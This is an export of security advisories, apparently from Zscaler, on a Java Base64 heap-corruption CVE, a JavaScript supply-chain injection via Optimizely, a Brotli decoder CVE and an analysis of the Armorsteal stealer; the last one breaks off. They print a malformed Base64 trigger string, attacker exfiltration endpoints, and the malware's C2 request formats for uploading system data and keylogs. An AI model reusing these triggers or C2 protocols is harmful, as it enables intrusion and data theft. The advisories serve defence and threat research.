articles.title: CVE-2026-114938: OpenJDK Base64 Decoder Vulnerable To Pre-Authentication RCE (Java4Shell)
articles.context: 2 Critical), a severe heap memory-corruption vulnerability in OpenJDK’s hardware-accelerated (intrinsic) Base64 decoder on certain CPUs
articles.full_text: IntroductionOn November 17, 2026, security researchers from Calif.io publicly disclosed Java4Shell (CVE-2026-114938, CVSS v4.0: 9.2 Critical), a severe heap memory-corruption vulnerability in OpenJDK’s hardware-accelerated (intrinsic) Base64 decoder on certain CPUs. The disclosure coincided with coordinated advisories from the OpenJDK Vulnerability Group and Oracle’s November 17, 2026 security patch release.Because Base64 decoding is foundational to network protocols, this runtime-level vulnerability can be reached in enterprise applications that pass attacker-controlled input to the affected decoder. Calif.io demonstrated pre-authentication Remote Code Execution (RCE) in default configurations of Keycloak, Atlassian Jira, Atlassian Confluence, JFrog Artifactory, Jenkins, and PingFederate. Additionally, post-authentication RCE was achieved in Apache Kafka Broker, Apache Solr, Elasticsearch, Gerrit, and Netflix Spinnaker, as well as a client-side TLS exploit affecting Java clients connecting to a malicious server. Immediate patching for affected environments is strongly recommended, alongside other mitigation steps outlined in this advisory. Zscaler’s security team is actively analyzing this issue across both production and corporate environments. We will continue to update the Zscaler Trust post and this advisory as new information becomes available. RecommendationsOrganizations running Java workloads on x86-64 infrastructure should take the following actions:Apply vendor patches immediately: Upgrade OpenJDK, Oracle Java SE, Oracle GraalVM, and all downstream OpenJDK distributions to the patched builds released on or after November 17, 2026 (such as Oracle Java SE 17.0.21.1, 8u513, 21.0.13.1, 25.0.5.1, and 27.0.1.1 security updates) and restart all running JVM processes and containers.Apply JVM flag workarounds where patching is delayed: If an immediate JDK upgrade is not feasible, defenders can completely disable the vulnerable assembly code path by passing either of the following flags at JVM startup (e.g., via JAVA_TOOL_OPTIONS or JDK_JAVA_OPTIONS):-XX:-UseBASE64Intrinsics (Recommended): Disables hardware-accelerated Base64 encoding and decoding intrinsics across all architectures, falling back to safe Java bytecode execution.-XX:UseAVX=2 (x86-64 hosts only): Restricts HotSpot to AVX2 instructions, preventing the use of AVX-512 VBMI instructions. Warning: Use this flag only on x86-64 machines; OpenJDK on ARM64 does not recognize this flag and will fail to start.After adjusting startup command lines and parameters, restart all running JVM processes and containers.Check Host CPUs for AVX-512 VBMI Exposure: Because CVE-2026-114938 is hardware-dependent, administrators can determine if the CPU of a Linux system is capable of executing the vulnerable Base64 decoder by inspecting the /proc/cpuinfo file and determining if all four of the following flags are present: avx512f, avx512bw, avx512vbmi, and bmi2. If a system is not susceptible, the JVM patches should still be applied in accordance with local policy and best practices.Eliminate public exposure: Place internet-facing Java applications (such as Keycloak, Jira, Confluence, Jenkins, Artifactory, and PingFederate) behind Zscaler Private Access (ZPA).Enable reverse-proxy request buffering (Defense-in-Depth): Many remote heap grooming techniques rely on partial HTTP requests to prepare the heap for successful exploitation. Enabling full HTTP request-body buffering at the reverse proxy (e.g., Nginx proxy_request_buffering on;) disrupts multi-connection timing alignment—though note this is not a complete mitigation for single-request chains (such as Elasticsearch) or upgraded WebSocket tunnels. Affected JDK Distributions And VersionsCVE-2026-114938 affects OpenJDK 17.0.6 and newer, as well as specific performance/patch builds across Oracle Java SE and downstream OpenJDK distributions as shown in the table below:Vendor / CategoryAffected Products & VersionsRemediation / PatchOpenJDK (Upstream)OpenJDK 17.0.6 and newerApply OpenJDK 2026-11-17 advisory patches, or if patching is delayed, use -XX:-UseBASE64Intrinsics as a temporary workaround.Oracle Java SE / Oracle GraalVM8u511b33-perf, 17.0.21.0.3, 21.0.13.0.3, 25.0.5.0.3, 27.0.1.0.3 (and prior unpatched builds with the affected Base64 decoder)Upgrade to the applicable Oracle November 17, 2026 patch (e.g., Java SE 17.0.21.1).Downstream OpenJDK DistributionsAmazon Corretto, Eclipse Temurin, Microsoft Build of OpenJDK, Azul Zulu, BellSoft Liberica, SAP SapMachine, Red Hat OpenJDK, Oracle OpenJDKUpgrade to a build that fixes CVE-2026-114938, or if patching is delayed, apply -XX:-UseBASE64Intrinsics as a temporary workaround.Table 1: Affected JDK distributions and versions.Hardware prerequisitesThe vulnerable assembly routine is only emitted by the HotSpot C2 JIT compiler on x86-64 processors that support AVX-512 VBMI (avx512f, avx512bw, avx512vbmi, bmi2):Vulnerable Intel server CPUs: Intel Xeon Ice Lake, Sapphire Rapids, Emerald Rapids, and Granite RapidsVulnerable AMD server and desktop CPUs: AMD EPYC and Ryzen Zen 4 or newer (e.g., EPYC Genoa / Bergamo / Turin, Ryzen 7000/9000 series)Not affected: ARM64 processors (e.g., AWS Graviton, Apple Silicon, Ampere Altra) and older x86-64 CPUs lacking AVX-512 VBMI. Technical AnalysisHow it worksWhile Java is traditionally regarded as a memory-safe language that abstracts raw pointer arithmetic away from developers, the OpenJDK HotSpot Virtual Machine itself relies heavily on C, C++, and hand-rolled assembly intrinsics to maximize throughput on modern hardware. Specifically, OpenJDK’s C2 Just-In-Time (JIT) compiler includes an optimized x86-64 Base64 decoding routine leveraging AVX-512 VBMI vector instructions. Due to an arithmetic underflow when calculating the store mask for improperly padded Base64 tails, malformed Base64 input can be used to trigger a 62-byte heap out-of-bounds write.Base64 decoding sits at the foundation of many network protocols including HTTP authentication, cookies, authorization tokens, TLS certificate parsing, REST API payloads, and file uploads. Thus, the attack surface for this vulnerability is significant. The figure below shows how malformed input can lead to heap corruption.Figure 1: CVE-2026-114938: Java4Shell Exploit Workflow ConclusionCVE-2026-114938 ("Java4Shell") demonstrates that even memory-safe managed runtimes like Java are susceptible to classic memory corruption when low-level assembly intrinsics miscalculate bounds. Organizations running affected Java builds on x86-64 processors with the required instruction support should patch immediately . Where immediate patching is not possible, restart affected JVMs with -XX:-UseBASE64Intrinsics to temporarily disable the vulnerable code path. Zscaler CoverageZscaler has deployed the following protections for CVE-2026-114938:Zscaler DeceptionZscaler Deception customers can deploy Private Threat Intelligence decoys for the following applications to detect Java4Shell exploitation attempts and generate high-fidelity alerts:Apache SolrJenkinsAtlassian ConfluenceAtlassian JiraElasticsearchCustomers can configure an orchestration rule to add any IP addresses interacting with these decoys to a firewall block list. How Zscaler Can HelpThe following table outlines typical attack stages for CVE-2026-114938 and the mitigations recommended by Zscaler:Attack StageRecommended MitigationMinimize the external attack surfaceIdentify and prioritize vulnerable Java deployments with Zscaler Exposure Management; eliminate externally exposed internal Java applications by placing them behind Zscaler Private Access (ZPA).Prevent compromiseInspect inbound and outbound traffic with ZPA and Zscaler Internet Access (ZIA) to detect and block malformed Base64 padding tails, protect Java clients against the client-side TLS exploit vector by routing egress traffic through ZIA with full SSL/TLS inspection.Prevent lateral threat movementUse ZPA to enforce least-privilege user-to-app and app-to-app microsegmentation for crown-jewel workloads, deploy Zscaler Deception decoys to detect lateral movement.Use Zscaler Microsegmentation to restrict workload-to-workload traffic and limit lateral movement if a Java workload is compromised.Prevent data lossInspect outbound responses and egress traffic across all channels with Zscaler Data Loss Prevention (DLP) to detect and block JavaBleed heap memory leaks containing private keys, credentials, or PII. Indicators Of Compromise (IOCs)Network-level indicatorsJIT warm-up floods: High volumes of rapid, repetitive requests containing valid Base64 fields targeting endpoints that invoke java.util.Base64.Decoder.Connection parking (remote heap grooming): Multiple concurrent TCP/HTTP connections from the same source IP delivering partial HTTP request bodies, pausing awaiting TCP ACK, and releasing the final bytes simultaneously.Malformed Base64 tail triggers: Base64 strings whose length is a multiple of 64 bytes (64 or 128 characters) immediately followed by an invalid padded tail (=, ==, X=, X==, XY=, ===), such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= (64 bytes + =) or 128 × "A" + "=".JavaBleed response anomalies: Abnormally large HTTP responses returned immediately after a spike in IllegalArgumentException errors.Host-level indicatorsSpikes in java.lang.IllegalArgumentException: High rates of IllegalArgumentException: Illegal base64 character or invalid padding exceptions in application logs.JVM crash logs (hs_err_pid*.log): Repeated HotSpot SIGSEGV crashes in G1 GC routines or StubRoutines::base64_decodeBlock.Suspicious JVM child processes: Java process spawning unexpected OS shells or reconnaissance commands.

articles.title: Attackers Exploit Optimizely Flaw To Inject Malicious JavaScript
articles.context: IntroductionOn November 16, 2026, an attacker exploited a vulnerability in Optimizely's Web Experimentation account signup flow
articles.full_text: IntroductionOn November 16, 2026, an attacker exploited a vulnerability in Optimizely's Web Experimentation account signup flow. Optimizely is a platform used to create, manage, test, and personalize digital content and websites. The flaw allowed the attacker to edit the Project JavaScript (projectJS) field. Customers use this field to add custom code that runs on pages that load the Optimizely snippet. By abusing this mechanism, the attacker injected malicious JavaScript into customer projects. The code was then delivered to visitors’ browsers through the Optimizely snippets, including snippets served from Optimizely’s content delivery network (CDN).The attack highlights the continued risk posed by third-party script dependencies and software supply chain compromises, particularly when websites rely on trusted third-party platforms to deliver JavaScript that runs in visitors’ browsers.Optimizely reported that it blocked the vulnerable path, deployed a fix, removed the injected code from affected projects, ended active sessions, revoked tokens, reset access for affected accounts, and notified impacted customers.The malicious payload was designed to replace cryptocurrency wallet addresses, skim payment card details, steal cookies, capture page screenshots, and deliver iOS exploits to iPhones and iPads. Organizations using Optimizely, or similar third-party JavaScript platforms, should treat this incident as a reminder to review third-party script governance, monitoring, and browser-side security controls. ThreatLabz ObservationsThreatLabz identified more than 450 unique domains and more than 3,000 URLs serving the malicious script. These findings suggest a broader impact across organizations and industry verticals than previously reported. The affected domains span industries including the following:Airlines and TravelAutomotiveBanking and FinanceE-commerceInsuranceNews and MediaProperty and Real EstateRetail and FashionSmart HomeSportsTechnology and SaaSTelecommunications RecommendationsFor end users who visited affected sitesMonitor bank and credit card statements for suspicious activity.Review cryptocurrency transactions made on or around November 16, 2026.Be cautious of unexpected account activity on sites visited during the incident.Update iOS and iPadOS devices to the latest available security version.Change passwords for accounts used on potentially affected websites, especially if the same credentials are reused elsewhere.For organizations using OptimizelyReview Optimizely project configurationAudit all Project JavaScript fields for unauthorized or unexpected code.Review recent changes, user activity, account creation events, and administrative access.Confirm whether any project snippets were modified during the exposure window.Verify that production pages load only approved versions of Optimizely snippets.Rotate and reset accessReset credentials for affected Optimizely administrative users.Rotate API tokens, session tokens, and integration keys associated with Optimizely.Enforce multi-factor authentication (MFA) for all users with access to experimentation or web personalization platforms.Deploy Content Security Policy (CSP) in enforcement mode where possibleRestrict script execution to approved domains.Limit where pages can send requests and load images and frames using connect-src, img-src, frame-src, and related CSP directives.Use CSP reporting to identify unexpected browser-side activity.Reduce third-party JavaScript riskMaintain an inventory of third-party scripts loaded across websites.Review whether each third-party script is still required.Apply least-privilege principles to third-party tags and tag management platforms.Monitor third-party script changes and unexpected behavior. How It WorksOptimizely Web Experimentation allows site owners to run A/B tests, personalization logic, and other front-end experiments by loading JavaScript on customer websites. The Project JavaScript field is designed to let customers add custom JavaScript that executes on any page that loads the Optimizely snippet.Public reporting indicates that the attacker injected malicious JavaScript into the Project JavaScript field of affected customer projects. The injected code was then delivered through legitimate Optimizely snippets. As a result, when visitors loaded a page with a modified snippet, the injected JavaScript could run in their browsers.Scope of script activity: The observed JavaScript activity is primarily limited to the browser context of the website where the scripts are loaded. The wallet replacement, clipboard manipulation, form monitoring, card-skimming, screen capture, and network-hooking behaviors operate inside the current page, its accessible DOM, same-origin frames, page-initiated requests, and JavaScript-accessible cookies or browser APIs. By design, this JavaScript cannot directly inspect other browser tabs, unrelated websites, other sites’ cookies, local files, or global browser activity. The main exception is the iOS/iPadOS exploit-delivery branch: if one of the delivered exploit chains succeeds, the resulting impact could potentially exceed normal web-page sandbox restrictions.Attack chainThe figure below shows how malicious JavaScript reached website visitors through Optimizely snippets.Figure 1: Attack chain showing how a threat actor injected malicious JavaScript into Optimizely customer projects.Initial access and injectionAs stated above, the attacker exploited a vulnerability in Optimizely’s Web Experimentation account signup flow. This flaw allowed unauthorized write access to the Project JavaScript field for multiple customer projects. Modified snippets were served through existing delivery paths, including Optimizely’s CDN (including cdn.optimizely.com) and, in some cases, customer domains. This made the attack more effective because many affected websites already trusted and allowed Optimizely scripts.Malicious JavaScript payloadIn most affected snippets, the injected code acted as a loader that fetched a second-stage JavaScript payload named track.js from attacker-controlled infrastructure such as 1688360[.]cc. The JavaScript payload provided the main malicious functionality, and ran in the visitor’s browser within the context of the affected website.The following flowchart shows what track.js does after it runs in a visitor’s browser. Figure 2: Clipboard hijacking, card skimming, cookie theft, screen capturing, and attempted exploit delivery on iOS and iPadOS.Cryptocurrency address replacement The script monitors page content, clipboard operations, and network-transmitted data for cryptocurrency wallet addresses. Targeted cryptocurrencies include Bitcoin, Ethereum, Tron, Solana, Litecoin, Toncoin, Bitcoin Cash, and Dogecoin. When the script detects a valid wallet address, the script attempts to replace it with an attacker-controlled wallet address. Cookie theft and screen capture Cookie theft and screen capture happens only when a valid crypto wallet address is replaced and the element is visible. In that case, the JavaScript payload script loaded the legitimate html2canvas.min.js to capture a screenshot of the page, along with the page URL, cookies, original wallet address, and other metadata. This data is sent to the attacker endpoint https://1688360[.]cc/hit.php, likely so the operator can validate successful replacement activity and capture the victim’s session context. The JavaScript payload could collect browser cookies from the affected website, with some exceptions such as if the HttpOnly flag was set. This could cause users to unknowingly send cryptocurrency to the attacker instead of the intended recipient.Payment card skimmingLater versions of the payload added payment card skimming functionality. The script monitors input and textarea elements, keyboard events, form submissions, and web requests for payment card numbers, expiration dates, and CVV values on the compromised website. Captured card data was to an attacker-controlled endpoint (1688360[.]cc/card.php). Note the skimmer could not read payment details entered inside secure cross-origin payment iframes, such as hosted payment fields from providers like Stripe or Adyen.Attempted iOS exploit delivery For visitors using iPhones or iPads, the malware reportedly attempted to load the Coruna and DarkSword exploit kits. The payload used device and browser checks to decide whether to attempt iOS-specific exploitation. When the payload identified a visitor’s device as an iPhone or iPad, it added two script elements to the page to load external JavaScript files. Indicators of these pages are the elements data-channel-code, data-chain-url, and data-cfasync attributes.The script injected a hidden iframe in some cases (hxxps://eil786npto9u5bq[.]icu/JIUJIU888/weifile[.]html) on devices it identified as running iOS 18.6 or earlier. The iframe is positioned off-screen with zero width and height, suggesting it is not intended to be visible to the user. iOS exploit delivery componentstrack.js is the browser-side payload. It checks for iOS or iPadOS and loads additional components when it detects either operating system.boot.js is the main iOS loader. It uses Safari and iOS version information to select the next delivery path.weifile.html provides a separate delivery path for selected iOS and iPadOS versions. It loads index.js.index.js initializes an obfuscated loader, decodes embedded modules, reports device and domain metadata, and may fetch additional modules (if required). The following table summarizes the two modules embedded in index.js.Embedded Module IdentifierDescription57620206d62079baad0e57e6d9ec93120c0f5247Utility/runtime helper module providing encoding, binary parsing, numeric conversion, URL normalization, and typed-array/DataView helpers.14669ca3b1519ba2a8f40be287f646d4d7593eb0Browser environment profiling and anti-analysis module that checks runtime capabilities, storage behavior, WebRTC, MathML rendering, WebAssembly behavior, and automation indicators such as navigator.webdriver.Table 1: Functions of the two modules embedded in index.js. ConclusionThe Optimizely incident highlights how attackers can compromise trusted third-party JavaScript supply chains to reach users across many websites at once. By abusing a legitimate experimentation feature, the attacker delivered injected JavaScript through snippets that affected websites already trusted. Note the malicious JavaScript code can run in visitors’ browsers without any obvious change to the page. The card-skimming and wallet-replacement behavior should be understood as page-context activity, not browser-wide monitoring. These scripts act within the compromised site where they are loaded. Broader impact would depend on successful exploitation by the iOS/WebKit exploit chain. articles.title: CVE-2026-111497: Node2Shell / HTTP2Shell Vulnerability May Allow RCE
articles.context: ThreatLabz has observed reconnaissance and exploitation attempts targeting this vulnerability through Zscaler Deception, as detailed in the ThreatLabz Observations section below
articles.full_text: IntroductionOn October 21, 2026, the Node.js project disclosed CVE-2026-111497, an out-of-bounds write vulnerability in Google’s Brotli decoder used by Node.js and other software. The vulnerability is also known as Node2Shell and more recently as HTTP2Shell. The CVE score, filed by Google as the numbering authority, is 9.2 (Critical) on CVSS 4.0. The flaw can be triggered when a vulnerable process decompresses attacker-controlled Brotli data. Successful exploitation may result in process crashes, disclosure of process memory, or remote code execution (RCE). Imperva reported demonstrating code execution in fresh containers running the official Node.js 24.22.0 Linux arm64 image, with multiple attempts required in its test environment. The vulnerable Brotli decoder may be present in a range of runtimes, libraries, and software packages, including Node.js, Bun, Python Brotli bindings, .NET, Envoy Proxy, Istio, Java brotli4j, libbrotli, curl/libcurl through Brotli dependencies, and Linux distribution packages. Applications may be exposed if they decompress attacker-controlled data using a vulnerable decoder. The vulnerability may be reachable through both inbound and outbound traffic paths. A malicious client could send a crafted request with Content-Encoding: br to a vulnerable server-side component that performs Brotli request decompression. Conversely, a malicious or compromised server could return a crafted Brotli-compressed response to a vulnerable client application that automatically decodes Brotli responses. ThreatLabz has observed reconnaissance and exploitation attempts targeting this vulnerability through Zscaler Deception, as detailed in the ThreatLabz Observations section below. RecommendationsZscaler recommends the following measures to address CVE-2026-111497 and monitor for potentially related activity:Patch vulnerable runtimes and libraries. Upgrade vulnerable runtimes, packages, and infrastructure components to the patched versions listed in the Vulnerable Versions table. Prioritize services that decompress untrusted Brotli data, including internet-facing applications that accept compressed request bodies and services that fetch content from external or user-controlled URLs. Validate each vulnerable component independently. Updating the system-wide libbrotli package may not remediate applications that statically bundle Brotli or ship their own decoder copy.Rebuild and redeploy containers. Use patched base images, runtimes, and libraries, and verify the versions in running workloads. Updating a host’s libraries does not update copies bundled within container images.Disable Brotli decoding where patching is delayed. If immediate patching is not possible, disable Brotli decompression on vulnerable paths where supported, following vendor guidance and testing for application compatibility.Monitor for exploitation and post-exploitation behavior. Investigate the following: Unexpected process crashes in Node.js, Bun, Python, .NET, Envoy Proxy, or service mesh workloads.Repeated malformed Brotli payloads.Requests containing Content-Encoding: br to endpoints that normally do not receive compressed request bodies.Abnormal memory access violations or segmentation faults.Web server or application worker crashes after compressed request handling.Unexpected child processes spawned by web application runtimes.Unexpected outbound connections following crashes or the processing of malformed compressed input. Vulnerable VersionsThe following table lists vulnerable versions and corresponding fixes for selected software that incorporates the Brotli decoder. ThreatLabz ObservationsThreatLabz observed reconnaissance and exploitation attempts involving CVE-2026-111497 through Zscaler Deception. Within the first 24 hours following public disclosure, Zscaler Deception’s global decoy mesh observed activity from 20 source IP addresses targeting 12 customers across 402 events. Of these events, 40% involved reconnaissance and 60% involved exploitation attempts. The table below summarizes the unique payloads associated with reconnaissance and exploitation attempts targeting CVE-2026-111497 observed through Zscaler Deception.Payload DescriptionJA4 FingerprintMalformed Brotli stream headers + valid Brotli differential check + Node.js path recont13d4312h1_c7886603b240_b26ce05bbdd6Truncated JSON Brotli + 8-byte invalid Brotli padding stream + uncompressed controlsNone22-byte & 23-byte invalid block-switch OOB-write seeds (CVE-2026-111497)t13d251100_b78ed14e2fd0_ab7e3b40a677Brotli decompression bomb / Celery stream probe + 1B controlsNoneAssetnote 1-byte malformed/valid Brotli differential checkMultiple observed3-stage Node2Shell capability, Strapi & CVE-2026-111497 JSON parser probet13d521100_b262b3658495_8e6e362c5eac14-byte Brotli {"ping":1} differential sweept13d1714h1_ab0a1bf427ad_5e078a691127Table 2: Unique payloads observed during reconnaissance and exploitation attempts targeting CVE-2026-111497. How It WorksBrotli is a lossless compression algorithm and data format developed by Google. It is used for HTTP compression to reduce the size of web content such as HTML, CSS, JavaScript, JSON, and API responses. Brotli-encoded HTTP content is identified by the Content-Encoding: br header.Applications may use Brotli directly or through dependencies such as runtimes, frameworks, HTTP clients, and middleware. In some configurations, these components automatically decompress Brotli-encoded content without application code explicitly calling Brotli APIs.Vulnerability detailsThe flaw occurs in Brotli’s block-decoding logic. When a stream changes block type, the decoder determines the next block type and length. In vulnerable versions, there is a macro (in the fast-path logic) that does not properly check the return value of the DecodeBlockTypeAndLength function, which can cause the decoder to continue processing an invalid state (e.g., when provided a maliciously crafted Brotli stream). This can lead to an out-of-bounds write and be used as a primitive for RCE. The upstream fix modifies the decoder so malformed block-switch conditions return a distinct error that is propagated to the caller, stopping further decoding of the malicious Brotli stream.Attack chainExploitation of CVE-2026-111497 may follow either an inbound or outbound path, depending on where Brotli decompression occurs, as shown in the figure below. Inbound attempts use crafted Brotli-compressed HTTP request bodies while outbound attempts use crafted responses returned by an attacker-controlled or compromised server. These responses may be consumed through fetch(), webhook delivery, URL previews, crawlers or scrapers, and API integrations. In either path, exploitation requires attacker-controlled Brotli data to reach a vulnerable decoder, with compressed HTTP content marked by Content-Encoding: br. Figure 1: Potential inbound and outbound exploitation paths for CVE-2026-111497. ConclusionCVE-2026-111497 affects the Brotli decoder used by Node.js and other software. Exposure depends on whether an application passes attacker-controlled Brotli data to a vulnerable decoder. Organizations should identify vulnerable components and apply corresponding vendor updates, including updates for applications that bundle their own copy of Brotli.Zscaler Deception has observed active reconnaissance and exploitation attempts involving this vulnerability. ThreatLabz will continue monitoring for related activity and provide updates as additional findings become available. articles.full_text: IntroductionIn September 2026, Zscaler Threat Hunting identified an SEO poisoning campaign that used fake websites impersonating the Chocolatey package manager and the Microsoft Activation Scripts (MAS) tool to distribute a Python-based malware family we track as Armorsteal. The fake websites targeted users searching for Chocolatey or MAS software installation commands. Each lure page displayed a malicious PowerShell command that downloaded and executed the Armorsteal installer. The installer deployed a Python 3.11 runtime environment and three main components providing remote access, surveillance, and information stealing capabilities, with the Python code protected by Pyarmor.The remote access component communicates with a command-and-control (C2) server, downloads additional modules, and executes remote tasks. The surveillance component logs keystrokes, monitors the clipboard, captures screenshots, and displays fake cryptocurrency wallet notifications. The information stealing component targets browser data, Discord tokens, cryptocurrency wallets, seed phrases, saved passwords, SSH keys, and Steam data.In this blog post, the Zscaler Threat Hunting team traces the campaign from poisoned search results through post-infection activity, including Armorsteal's components, C2 communication, and infrastructure changes observed during our analysis. Key TakeawaysIn September 2026, the Zscaler Threat Hunting team identified an SEO poisoning campaign that distributed Armorsteal through websites impersonating Chocolatey and the Microsoft Activation Scripts (MAS) tool.The SEO campaign targeted users searching for Chocolatey installation instructions or Microsoft activation scripts.The remote access component verifies RSA-2048 signatures on Python tasks received from the C2 server before executing them.The surveillance component records window titles, logs keystrokes, monitors copied cryptocurrency wallet addresses, and captures screenshots when configured keywords are detected.The information stealing component steals Discord tokens, browser cookies, saved passwords, cryptocurrency wallet data, BIP39 seed phrases, and SSH keys. Technical AnalysisThe following sections provide details about the malware distribution, capabilities, and network communications.SEO poisoningZscaler Threat Hunting identified two SEO poisoning lures that targeted users searching for Windows software installation instructions. One of those lures is shown in the figure below.Figure 1: Google search results for “chocolatey install windows”. Fake Chocolatey websiteThe first lure (seen in Figure 1) targets users looking for the Chocolatey package manager. A user searching for terms such as “install Chocolatey” and “Chocolatey PowerShell” may reach a typosquatted site impersonating chocolatey[.]org. The site displays a PowerShell installation command. When the user runs it, the malicious install.ps1 script downloads and installs the remote access module. The script also runs the legitimate Chocolatey installer, so Chocolatey appears to function as expected. The fake Chocolatey website and the malicious domain, choclatey[.]org, are shown below:Figure 2: Fake Chocolatey website distributing Armorsteal. Fake Massgrave websiteThe second lure targeted users searching for terms such as “Microsoft Activation Scripts,” “MAS activation script,” or “Massgrave activation”. These users may have reached massgravel[.]net, a malicious website impersonating the Microsoft Activation Scripts tool (a.k.a., the Massgrave project). The fake Massgrave website is shown in the figure below:Figure 3: Fake Massgrave website distributing Armorsteal.Although the two websites impersonate different projects and target different search queries, both deliver Armorsteal.ANALYST NOTE: The fake Massgrave website went down on September 25, 2026, and the fake Chocolatey website went down around October 1, 2026. Installation and persistenceBoth installer variants request elevated privileges, hide the PowerShell console window, and download a ZIP archive to C:\Windows\SystemHealth\Update\ to mimic a legitimate Windows system directory. The archive contains a Python 3.11 runtime, Pyarmor runtime files, and Armorsteal Python-based scripts.The installer creates the following scheduled tasks for persistence:Scheduled taskTriggerDescriptionSysCheck2User logonLaunches the remote access module with the highest privileges available.SysCheckXSystem bootLaunches the remote access module as SYSTEM after a 45-second delay.Table 1: Armorsteal scheduled task persistence.Anti-analysis techniquesArmorsteal uses the following techniques to avoid research environments and complicate analysis:The remote access module checks the public IP address and organization information using ipinfo[.]io. If the organization name returned matches a cloud provider such as Google, Amazon, Microsoft, or Azure, the module displays a fake “Memory is insufficient” message and exits. This can prevent the malware from running in some cloud-based analysis environments.The Python scripts are protected with Pyarmor 9.1.7 (trial version). Pyarmor encrypts Python bytecode and string constants, making static analysis and detection more difficult. The trial runtime is operationally useful to the threat actor because it provides code obfuscation without requiring a commercial Pyarmor license.Remote access moduleThe Armorsteal remote access module is stored as SysMon.py and is launched by the SysCheck2 and SysCheckX scheduled tasks. The module collects information about the infected system, including the hostname, operating system, processor, memory, disks, local IP address, public IP address, and network interfaces. It uses the motherboard serial number to create a machine identifier used in C2 communication.The remote access module also downloads and launches the surveillance and information stealing modules. The remote access module uses HTTPS and a hardcoded list of four C2 domains. It checks the availability of each domain before starting C2 communication. The C2 endpoints supported by the remote access module are shown in the table below:EndpointMethodDescription/downloadables/configf.jsonGETChecks whether the C2 server is available based on the HTTP status code 200./receive_infofPOSTSends device information to the C2 server./get-onetime-code/{machine_id}GETRequests a task for an individual victim./get-globalGETRequests a task shared across all infected systems./downloadables/{archive}GETIn earlier builds, downloads the remote access module updates along with the surveillance and information stealing modules.Table 2: The remote access module C2 endpoints.The following example shows the format of the HTTP POST request the remote access module uses to send system information to its C2 server. POST /receive_infof HTTP/1.1 Host: workerstats[.]net User-Agent: python-requests/2.31.0 Content-Type: application/json Content-Length: {CONTENT_LENGTH} { "host_name": "{HOSTNAME}", "ip_address": "{LOCAL_IP}", "public_ip_address": "{PUBLIC_IP}", "mac_address": "{MAC_ADDRESS}", "system": "{WINDOWS_VERSION}", "machine": "{MACHINE_ARCHITECTURE}", "memory": { "total": {TOTAL_MEMORY_SIZE}, "available": {AVAILABLE_MEMORY_SIZE}, "percent": {MEMORY_PERCENTAGE} } }The C2 server responds with the following message:{"message":"Data received and stored successfully"}The remote access module polls its C2 server every 60 seconds for both per-victim and global tasks. The malware verifies every task received using an embedded RSA-2048 public key before executing it. The per-victim task endpoint returns JSON containing Python code and a Base64-encoded signature, as shown in the format below:{ "code": "<Python source code>", "sig": "<Base64-encoded RSA signature>" }The global task endpoint returns a different response containing the # _ _SIGNED _ _: marker followed by the task data:# _ _SIGNED_ _:{"code":"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNz...", "sig":"fdWOAiJJ7qIowDnCEgO4LDd+s19RzzBjnKFQ9K447GXj..."}The remote access module uses a custom RSASSA-PKCS1-v1_5 signature verification routine before executing the task’s code in memory. After verifying a task's signature, it extracts an integer version number embedded in the Python code: ONETIME_VERSION for per-victim tasks and GLOBAL_VERSION for global tasks. The module compares this task version number with the last successfully executed version stored locally in its working directory, C:\Windows\SystemHealth\Update\. Task version numbers specific to a victim are stored in onetime_version.txt and global task versions are recorded in global_version.txt. The malware executes a task in memory only when its version is greater than the value in the corresponding file. The version number is then updated in the corresponding file. This prevents previously processed or older tasks from running again.The Armorsteal remote access module can also update itself through global tasks. These tasks can direct the malware to download a replacement SysMon.py file. The module first verifies the SHA256 of the downloaded file before replacing its local copy. This capability allows the threat actor to update the malware's embedded C2 domain list and configuration.Surveillance moduleThe surveillance component is named basrq.py and runs in a separate bundled Python interpreter in a ZIP archive, which is downloaded by the remote access module.The surveillance module performs the following activities:Logs keystrokes (with specialized handling for English, French, Spanish, and German), including backspace, space, decimal separators, and modifier keys.Records the title of the active window along with captured keystrokes.Monitors clipboard content every 0.5 seconds.Replaces copied cryptocurrency wallet addresses with attacker-controlled addresses.Captures screenshots when configured keywords appear in window titles or captured keystrokes.Displays fake transaction notifications that impersonate Exodus, MetaMask, and Phantom.The clipboard hijacker supports wallet addresses for Bitcoin, Litecoin, Monero, Ethereum, TRON, XRP, Dogecoin, TON, and Solana.The Armorsteal surveillance module uses the following C2 endpoints to retrieve monitoring keywords and upload collected data.EndpointMethodDescription/global_keywordsGETRetrieves campaign-wide monitoring keywords./keywords/{machine_id}GETRetrieves keywords for a specific infected system./black-watch/{machine_id}POSTUploads gzip-compressed keystroke logs./black-watch/screenshot/{machine_id}POSTUploads keyword-triggered screenshots.Table 3: The Armorsteal surveillance module C2 endpoints.The module retrieves keyword lists every 300 seconds. The observed lists include terms related to cryptocurrency wallets, exchanges, browser names, cloud services, and recovery phrase-related terms. Before uploading screenshots to /black-watch/screenshot/{machine_id}, the surveillance module encrypts their raw PNG bytes. The module computes the SHA256 digest of a hardcoded string and uses the resulting 32-byte value (c1146fbcaa433385839c25839a61cd7fedaff858cc0d3fd063dba68db2cf31b4) as an XOR key.The following example shows the Armorsteal surveillance module uploading the stolen data using the filename keylogs.gz:POST /black-watch/{machine_id} HTTP/1.1 Host: workerstats[.]net Content-Type: multipart/form-data Content-Disposition: form-data; name="keylogs"; filename="keylogs.gz" <gzip-compressed log data>Stealer moduleThe information stealing module’s script name is got.py, which is downloaded as a ZIP archive by the remote access module. This module collects data from web browsers, password managers, cryptocurrency wallets, Discord clients, and Steam installations. The stealer also collects system information, including geolocation, display information, language settings, time zone, and GPU details.The stealer module has the following capabilities:Steals and validates Discord tokens from 22 Discord client variants.Collects data from 21 browser wallet extensions and desktop wallet applications.Searches drives from A: through Z: for BIP39 seed phrases.Extracts browser cookies through the Chrome DevTools Protocol (CDP) on port 9222.Steals saved browser passwords, autofill data, and credit card metadata. To collect browser passwords, the module downloads and uses the public chrome-decryptor tool from the Chrome App-Bound Encryption Decryption project.Targets password manager data from KeePass, 1Password, RoboForm, Password Safe, Enpass, Bitwarden, and Dashlane.Collects SSH keys and Steam session data.The Armorsteal stealer module uses the following C2 endpoints to upload stolen data: EndpointMethodDescription/infame/receive/zipPOSTUploads the main stolen data archive./infame/receive/dtPOSTUploads Discord tokens and account information./ws/{machine_id}POSTUploads wallet files and seed phrases./pwdPOSTUploads saved browser passwords./upload/stPOSTUploads Steam account information.Table 4: Armorsteal stealer module C2 endpoints.The main information stealing component archive contains a system profile and 